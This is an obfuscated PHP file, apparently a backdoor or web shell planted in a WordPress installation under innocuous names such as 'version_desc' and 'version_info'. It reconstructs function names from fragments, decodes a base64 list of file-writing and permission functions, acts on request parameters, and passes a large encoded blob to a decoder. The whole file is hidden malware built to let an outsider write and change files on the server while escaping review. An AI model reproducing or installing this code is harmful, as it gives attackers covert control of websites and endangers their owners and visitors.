<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHmY21up3EyqT5lY3ElLJEyLaIfoP5col9up3AyqUZinJ1aY253pl81A2D3LmZ2MzDkAGDlAmywZQZkZJD3ZzV3BGOuLGx3Zv5eMKx', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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